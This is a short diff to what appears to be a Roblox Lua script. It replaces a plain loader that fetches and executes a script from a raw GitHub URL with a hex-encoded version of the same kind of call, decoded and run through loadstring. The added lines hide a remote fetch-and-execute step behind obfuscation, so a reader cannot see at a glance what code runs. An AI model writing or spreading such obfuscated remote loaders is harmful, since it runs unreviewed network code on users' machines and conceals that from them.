@@ -1,1 +1,5 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AEverhub//main/luaf"))()
+local hex = "6c6f6164737472696e672867616d653a487474476574282268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f41457665726875622f73746f7265686f7573653231392f6d61696e2f737263222c207472756529282929"
+local function hex_to_string(hex)
+    return (hex:gsub('..', function(cc) return string.char(tonumber(cc, 16)) end))
+end
+loadstring(hex_to_string(hex))()
